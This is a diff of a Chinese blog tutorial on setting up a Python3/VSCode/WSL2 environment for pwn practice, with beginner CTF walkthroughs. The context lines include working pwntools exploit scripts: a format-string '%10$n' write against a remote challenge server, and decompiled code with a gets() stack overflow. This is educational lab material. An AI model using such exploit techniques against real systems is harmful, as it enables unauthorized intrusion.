@@ -50,6 +50,38 @@
 
 
 
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Microsoft YaHei:300,300italic,400,400italic,700,700italic|Microsoft YaHei:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
 
 
 
@@ -84,13 +116,13 @@
 
 
 
-<meta name="description" content="0x00 前言随着进入全面建成小康社会的最后一年，Python2也正式停止了支持。网上的pwn基础教程很多都过时了，写着peda、pwntools、pwndbg等只支持py2，现在看起来是不太对，迁移是大势所趋，很多项目尤其是大项目早就完成了向py3的迁移，有图为证。最近宅在家里又比较闲，想着能不能把环境迁移到py3上，一番折腾后感觉还不错，故把自己踩到的坑写下来，也写一篇基础教程。我就是ecli">
+<meta name="description" content="0x00 前言随着进入全面建成小康社会的最后一年，Python2也正式停止了支持。网上的pwn基础教程很多都过时了，写着peda、pwntools、pwndbg等只支持py2，现在看起来是不太对，迁移是大势所趋，很多项目尤其是大项目早就完成了向Python3的迁移，有图为证。最近宅在家里又比较闲，想着能不能把环境迁移到Python3上，一番折腾后感觉还不错，故把自己踩到的坑写下来，也写一篇基础教程">
 <meta name="keywords" content="pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="py3+VSCode+WSL2的pwn环境配置与使用">
+<meta property="og:title" content="Python3+VSCode+WSL2的pwn环境配置与使用">
 <meta property="og:url" content="https://blog.fe1yu.com/2020/01/28/py3-VSCode-WSL2的pwn环境配置与测试/index.html">
 <meta property="og:site_name" content="fe1yu&#39;blog">
-<meta property="og:description" content="0x00 前言随着进入全面建成小康社会的最后一年，Python2也正式停止了支持。网上的pwn基础教程很多都过时了，写着peda、pwntools、pwndbg等只支持py2，现在看起来是不太对，迁移是大势所趋，很多项目尤其是大项目早就完成了向py3的迁移，有图为证。最近宅在家里又比较闲，想着能不能把环境迁移到py3上，一番折腾后感觉还不错，故把自己踩到的坑写下来，也写一篇基础教程。我就是ecli">
+<meta property="og:description" content="0x00 前言随着进入全面建成小康社会的最后一年，Python2也正式停止了支持。网上的pwn基础教程很多都过时了，写着peda、pwntools、pwndbg等只支持py2，现在看起来是不太对，迁移是大势所趋，很多项目尤其是大项目早就完成了向Python3的迁移，有图为证。最近宅在家里又比较闲，想着能不能把环境迁移到Python3上，一番折腾后感觉还不错，故把自己踩到的坑写下来，也写一篇基础教程">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://s2.ax1x.com/2020/01/30/11BsL8.jpg">
 <meta property="og:image" content="https://s2.ax1x.com/2020/01/30/11Brsf.jpg">
@@ -106,10 +138,10 @@
 <meta property="og:image" content="https://img-blog.csdnimg.cn/2019082717285142.png">
 <meta property="og:image" content="https://s2.ax1x.com/2020/01/31/18mOkF.jpg">
 <meta property="og:image" content="https://s2.ax1x.com/2020/01/31/18mqTU.jpg">
-<meta property="og:updated_time" content="2020-02-28T07:10:37.981Z">
+<meta property="og:updated_time" content="2020-03-04T08:08:06.614Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="py3+VSCode+WSL2的pwn环境配置与使用">
-<meta name="twitter:description" content="0x00 前言随着进入全面建成小康社会的最后一年，Python2也正式停止了支持。网上的pwn基础教程很多都过时了，写着peda、pwntools、pwndbg等只支持py2，现在看起来是不太对，迁移是大势所趋，很多项目尤其是大项目早就完成了向py3的迁移，有图为证。最近宅在家里又比较闲，想着能不能把环境迁移到py3上，一番折腾后感觉还不错，故把自己踩到的坑写下来，也写一篇基础教程。我就是ecli">
+<meta name="twitter:title" content="Python3+VSCode+WSL2的pwn环境配置与使用">
+<meta name="twitter:description" content="0x00 前言随着进入全面建成小康社会的最后一年，Python2也正式停止了支持。网上的pwn基础教程很多都过时了，写着peda、pwntools、pwndbg等只支持py2，现在看起来是不太对，迁移是大势所趋，很多项目尤其是大项目早就完成了向Python3的迁移，有图为证。最近宅在家里又比较闲，想着能不能把环境迁移到Python3上，一番折腾后感觉还不错，故把自己踩到的坑写下来，也写一篇基础教程">
 <meta name="twitter:image" content="https://s2.ax1x.com/2020/01/30/11BsL8.jpg">
 
 
@@ -146,7 +178,7 @@
 
 
 
-  <title>py3+VSCode+WSL2的pwn环境配置与使用 | fe1yu'blog</title>
+  <title>Python3+VSCode+WSL2的pwn环境配置与使用 | fe1yu'blog</title>
   
 
 
@@ -300,7 +332,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">py3+VSCode+WSL2的pwn环境配置与使用</h1>
+          <h1 class="post-title" itemprop="name headline">Python3+VSCode+WSL2的pwn环境配置与使用</h1>
         
 
         <div class="post-meta">
@@ -362,7 +394,7 @@
 
           
           
-             <span id="/2020/01/28/py3-VSCode-WSL2的pwn环境配置与测试/" class="leancloud_visitors" data-flag-title="py3+VSCode+WSL2的pwn环境配置与使用">
+             <span id="/2020/01/28/py3-VSCode-WSL2的pwn环境配置与测试/" class="leancloud_visitors" data-flag-title="Python3+VSCode+WSL2的pwn环境配置与使用">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -374,11 +406,6 @@
              </span>
           
 
-          
-            <span class="post-meta-divider">|</span>
-            <span class="page-pv"><i class="fa fa-thermometer-three-quarters" aria-hidden="true"></i> 热度
-            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
-            </span>℃
           
 
           
@@ -431,11 +458,11 @@
       
 
       
-        <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>随着进入全面建成小康社会的最后一年，Python2也正式停止了支持。网上的pwn基础教程很多都过时了，写着peda、pwntools、pwndbg等只支持py2，现在看起来是不太对，迁移是大势所趋，很多项目尤其是大项目早就完成了向py3的迁移，有图为证。最近宅在家里又比较闲，想着能不能把环境迁移到py3上，一番折腾后感觉还不错，故把自己踩到的坑写下来，也写一篇基础教程。我就是eclipse插件拉满卡死，Vim快捷键记到头秃我也不会用VSCode，哎呀妈呀，真香。至于为什么选择VSCode，那肯定是因为它火，蹭它热度呗。（大雾）在WSL里可以很方便的访问hostOS的文件，而且WSL2使用了完整的的Linux内核，其本质就是基于hyper-V的虚拟机，考虑到兼容性问题故选用WSL2。再辅以Windows Terminal简直破费。话不多说，整。<br><a id="more"></a><br><a href="https://imgchr.com/i/11BsL8" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/01/30/11BsL8.jpg" alt="11BsL8.jpg"></a><br><a href="https://imgchr.com/i/11Brsf" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/01/30/11Brsf.jpg" alt="11Brsf.jpg"></a><br><a href="https://imgchr.com/i/11BDQP" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/01/30/11BDQP.jpg" alt="11BDQP.jpg"></a></p>
+        <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>随着进入全面建成小康社会的最后一年，Python2也正式停止了支持。网上的pwn基础教程很多都过时了，写着peda、pwntools、pwndbg等只支持py2，现在看起来是不太对，迁移是大势所趋，很多项目尤其是大项目早就完成了向Python3的迁移，有图为证。最近宅在家里又比较闲，想着能不能把环境迁移到Python3上，一番折腾后感觉还不错，故把自己踩到的坑写下来，也写一篇基础教程。我就是eclipse插件拉满卡死，Vim快捷键记到头秃我也不会用VSCode，哎呀妈呀，真香。至于为什么选择VSCode，那肯定是因为它火，蹭它热度呗。（大雾）在WSL里可以很方便的访问hostOS的文件，而且WSL2使用了完整的的Linux内核，其本质就是基于hyper-V的虚拟机，考虑到兼容性问题故选用WSL2。再辅以Windows Terminal简直破费。话不多说，整。<br><a id="more"></a><br><a href="https://imgchr.com/i/11BsL8" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/01/30/11BsL8.jpg" alt="11BsL8.jpg"></a><br><a href="https://imgchr.com/i/11Brsf" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/01/30/11Brsf.jpg" alt="11Brsf.jpg"></a><br><a href="https://imgchr.com/i/11BDQP" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/01/30/11BDQP.jpg" alt="11BDQP.jpg"></a></p>
 <h1 id="0x01-WSL2的安装"><a href="#0x01-WSL2的安装" class="headerlink" title="0x01 WSL2的安装"></a>0x01 WSL2的安装</h1><p>控制面板→程序→启用或关闭windows功能→勾选适用Linux的Windows子系统，重启。WSL2与WSL1不一样，第一次使用虚拟机的同学可能需要进入BIOS开启硬件虚拟化，不同的机型具体操作不同，搜索引擎对症下药即可。</p>
 <p><a href="https://imgchr.com/i/11B6eS" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/01/30/11B6eS.jpg" alt="11B6eS.jpg"></a></p>
 <p>命令行输入<code>WSL --set-default-version 2</code>把WSL2设置为默认WSL，也可以为不同的发行版指定不同的WSL版本，也可以互相转换，具体操作键入 <code>WSL -h</code>查看。</p>
-<p>Windows应用商店提供了若干个发行版，我们选用Ubuntu，直接搜索Ubuntu就可以，默认的是18.04，你也可以安装16.04。安装包都只有小几百MB，官方打包，干净的一比。Ubuntu18.04默认已经不提供py2了，只提供py3。还可以顺手在应用商店里安装一个Windows Terminal，美观易用，关于Windows Terminal的配置网上也有教程。在Windows Terminal或者PowerShell里键入WSL即可启动默认发行版。</p>
+<p>Windows应用商店提供了若干个发行版，我们选用Ubuntu，直接搜索Ubuntu就可以，默认的是18.04，你也可以安装16.04。安装包都只有小几百MB，官方打包，干净的一比。Ubuntu18.04默认已经不提供py2了，只提供Python3。还可以顺手在应用商店里安装一个Windows Terminal，美观易用，关于Windows Terminal的配置网上也有教程。在Windows Terminal或者PowerShell里键入WSL即可启动默认发行版。</p>
 <p><img src="https://s2.ax1x.com/2020/01/30/11BRij.jpg" alt="11BRij.jpg"></p>
 <p>tips：如果报可能是因为Windows操作系统版本较低，更新一下或者加入Windows预览体验计划。</p>
 <h1 id="0x02-Linux的配置"><a href="#0x02-Linux的配置" class="headerlink" title="0x02 Linux的配置"></a>0x02 Linux的配置</h1><p>鉴于网络环境，可以把软件源还有pip源都换成国内，网上教程很多，不再赘述。</p>
@@ -462,7 +489,7 @@
 <p><code>git clone https://github.com/lieanu/LibcSearcher.git</code><br><code>cd LibcSearcher</code><br><code>python3 setup.py develop</code></p>
 <p>增强gdb插件的插件有很多，peda、gef、pwndbg、pwngdb，这些插件各有所长。由于各种各样的问题尝试同时安装多个插件在使用的时候总是出现bug（还是我太菜，解决不了兼容问题，哭唧唧），所以你可以安装多个但每次只用一个，通过改写<strong>.gdbinit</strong>文件控制每次加载的插件，这里只安装pwndbg。</p>
 <p><code>git clone https://github.com/pwndbg/pwndbg</code><br><code>cd pwndbg</code><br><code>./setup.sh</code></p>
-<p>命令行输入<code>gdb</code>测试正常，可能有的小伙伴会报错，这时查看一下你的gdb使用的py是什么版本，大家都是py3就很好说话了。</p>
+<p>命令行输入<code>gdb</code>测试正常，可能有的小伙伴会报错，这时查看一下你的gdb使用的py是什么版本，大家都是Python3就很好说话了。</p>
 <p><a href="https://imgchr.com/i/11Bcdg" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/01/30/11Bcdg.jpg" alt="11Bcdg.jpg"></a></p>
 <p>安装pwntools。</p>
 <p><code>apt-get update</code><br><code>apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential</code><br><code>python3 -m pip install --upgrade pip</code><br><code>python3 -m pip install --upgrade git+https://github.com/Gallopsled/pwntools.git@dev</code></p>
@@ -490,7 +517,7 @@
 <p><img src="https://s2.ax1x.com/2020/01/31/18mXY4.jpg" alt="18mXY4.jpg"></p>
 <p>A的ascii码16进制值正是0x41，数一数就知道AAAA相对于格式化字符串的偏移量是10，然后写exp。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'111.198.29.45'</span>,<span class="number">46753</span>)</span><br><span class="line">pwnme_addr = <span class="number">0x0804A068</span></span><br><span class="line">payload1 = <span class="string">'fe1yu'</span></span><br><span class="line">payload2 = p32(pwnme_addr)+<span class="string">'abcd'</span>+<span class="string">'%10$n'</span></span><br><span class="line">p.recvuntil(<span class="string">'please tell me your name:\n'</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">'leave your message please:\n'</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"><span class="keyword">print</span> (p.recv())</span><br><span class="line"><span class="keyword">print</span> (p.recv())</span><br></pre></td></tr></table></figure>
-<p>为什么要这么写呢?p32会把0x0804A068打包成32位系统的地址，也就是4个字节，这也是为什么用4个A测试毕竟占用四字节，abcd也是4个字节，刚好使pwnme等于8。为什么写两个print是因为一次输出name，一次输出message。运行脚本，BOOM！报错，为什么呢？其实这里有一个坑就是py3是默认UTF-8编码的，一个字符占用空间并不是1字节，所以你的字符串并不是4字节，这时候需要强制类型转换，在字符串前加一个<strong>b</strong>，正确exp如下。</p>
+<p>为什么要这么写呢?p32会把0x0804A068打包成32位系统的地址，也就是4个字节，这也是为什么用4个A测试毕竟占用四字节，abcd也是4个字节，刚好使pwnme等于8。为什么写两个print是因为一次输出name，一次输出message。运行脚本，BOOM！报错，为什么呢？其实这里有一个坑就是Python3是默认UTF-8编码的，一个字符占用空间并不是1字节，所以你的字符串并不是4字节，这时候需要强制类型转换，在字符串前加一个<strong>b</strong>，正确exp如下。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'111.198.29.45'</span>,<span class="number">32386</span>)</span><br><span class="line">pwnme_addr = <span class="number">0x0804A068</span></span><br><span class="line">payload1 = <span class="string">'abcd'</span></span><br><span class="line">payload2 = p32(pwnme_addr)+<span class="string">b'abcd'</span>+<span class="string">b'%10$n'</span></span><br><span class="line">p.recvuntil(<span class="string">'please tell me your name:\n'</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">'leave your message please:\n'</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"><span class="keyword">print</span> (p.recv())</span><br><span class="line"><span class="keyword">print</span> (p.recv())</span><br></pre></td></tr></table></figure>
 <h2 id="0x02-when-did-you-born"><a href="#0x02-when-did-you-born" class="headerlink" title="0x02 when_did_you_born"></a>0x02 when_did_you_born</h2><p>还是老一套，checksec一下，idaF5看一下伪C代码。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> name; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> input_birth; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What's Your Birth?"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;input_birth);</span><br><span class="line">  <span class="keyword">while</span> ( getchar() != <span class="number">10</span> )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( input_birth == <span class="number">1926</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You Cannot Born In 1926!"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"What's Your Name?"</span>);</span><br><span class="line">    gets((__int64)&amp;name);                       <span class="comment">// stack overflow here</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"You Are Born In %d\n"</span>, input_birth);</span><br><span class="line">    <span class="keyword">if</span> ( input_birth == <span class="number">1926</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You Shall Have Flag."</span>);</span><br><span class="line">      system(<span class="string">"cat flag"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You Are Naive."</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You Speed One Second Here."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -506,7 +533,7 @@
 <p>体会过上面几个题你应该有了感觉，pwn就是在看似做不到的事情中寻求那一点突破。这地方不行，那我就从另一个地方到达，看似不可写实则可读可写（菜鸡愚见）。</p>
 <h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h1><p>这套环境突出一个方便快捷，WSL2我这性能羸弱的机器也只需要3-5秒就能启动，exp写完直接就能在VSCode里得出结果，文件交互也比较流畅，不需要VMtools。有问题就是现在WSL2与VMware不兼容，不知道这个问题解决了没有。<br>写的时候我自己都觉得我啰嗦，我觉得我写的还是比较细致了，但我相信还是零基础看还是不太可能一下子弄明白，毕竟我也是零基础入门，当然我现在也是菜的也批。我看零基础pwn入门之类的文章时也看不懂，其实pwn零基础是真的不能入门也学不懂的，这也是一些人吐槽网上的pwn教程对新手真的不是特别友好，造成pwn入门门槛偏高的原因之一 吧。关于到底怎么入门，就像yuange说的（大意）：我就是看汇编语言，操作系统，计算机原理等。</p>
 <p>这套环境突出一个方便快捷，WSL2我这性能羸弱的机器也只需要3-5秒就能启动，exp写完直接就能在VSCode里得出结果，文件交互也比较流畅，不需要VMtools。有问题就是现在WSL2与VMware不兼容，不知道这个问题解决了没有。写的时候我自己都觉得我啰嗦，我觉得我写的还是比较细致了，但我相信还是零基础看还是不太可能一下子弄明白，毕竟我也是零基础入门，当然我现在也是菜的也批。我看零基础pwn入门之类的文章时也看不懂，其实pwn零基础是真的不能入门也学不懂的，这也是一些人吐槽网上的pwn教程对新手真的不是特别友好，造成pwn入门门槛偏高的原因之一 吧。关于到底怎么入门，就像yuange说的（大意）：我就是看汇编语言，操作系统，计算机原理等。</p>
-<p>1.<a href="https://github.com/giantbranch/pwn-env-init" target="_blank" rel="noopener">https://github.com/giantbranch/pwn-env-init</a><br>2.<a href="https://blog.csdn.net/baidu_36804484/article/details/88803846" target="_blank" rel="noopener">https://blog.csdn.net/baidu_36804484/article/details/88803846</a><br>3.<a href="https://www.cnblogs.com/rec0rd/p/7646857.html" target="_blank" rel="noopener">https://www.cnblogs.com/rec0rd/p/7646857.html</a></p>
+<h1 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h1><p>1.<a href="https://github.com/giantbranch/pwn-env-init" target="_blank" rel="noopener">https://github.com/giantbranch/pwn-env-init</a><br>2.<a href="https://blog.csdn.net/baidu_36804484/article/details/88803846" target="_blank" rel="noopener">https://blog.csdn.net/baidu_36804484/article/details/88803846</a><br>3.<a href="https://www.cnblogs.com/rec0rd/p/7646857.html" target="_blank" rel="noopener">https://www.cnblogs.com/rec0rd/p/7646857.html</a></p>
 
       
     </div>
@@ -556,7 +583,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="https://blog.fe1yu.com/2020/01/28/py3-VSCode-WSL2的pwn环境配置与测试/" title="py3+VSCode+WSL2的pwn环境配置与使用">https://blog.fe1yu.com/2020/01/28/py3-VSCode-WSL2的pwn环境配置与测试/</a>
+    <a href="https://blog.fe1yu.com/2020/01/28/py3-VSCode-WSL2的pwn环境配置与测试/" title="Python3+VSCode+WSL2的pwn环境配置与使用">https://blog.fe1yu.com/2020/01/28/py3-VSCode-WSL2的pwn环境配置与测试/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>
@@ -749,7 +776,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-前言"><span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-WSL2的安装"><span class="nav-text">0x01 WSL2的安装</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-Linux的配置"><span class="nav-text">0x02 Linux的配置</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-VSCode的安装及使用"><span class="nav-text">0x03 VSCode的安装及使用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-简单实战"><span class="nav-text">0x04 简单实战</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-get-shell"><span class="nav-text">0x00 get shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-CGfsb"><span class="nav-text">0x01 CGfsb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-when-did-you-born"><span class="nav-text">0x02 when_did_you_born</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-hello-pwn"><span class="nav-text">0x03 hello_pwn</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x05-总结"><span class="nav-text">0x05 总结</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-前言"><span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-WSL2的安装"><span class="nav-text">0x01 WSL2的安装</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-Linux的配置"><span class="nav-text">0x02 Linux的配置</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-VSCode的安装及使用"><span class="nav-text">0x03 VSCode的安装及使用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-简单实战"><span class="nav-text">0x04 简单实战</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-get-shell"><span class="nav-text">0x00 get shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-CGfsb"><span class="nav-text">0x01 CGfsb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-when-did-you-born"><span class="nav-text">0x02 when_did_you_born</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-hello-pwn"><span class="nav-text">0x03 hello_pwn</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x05-总结"><span class="nav-text">0x05 总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x06-参考链接"><span class="nav-text">0x06 参考链接</span></a></li></ol></div>
             
 
           </div>
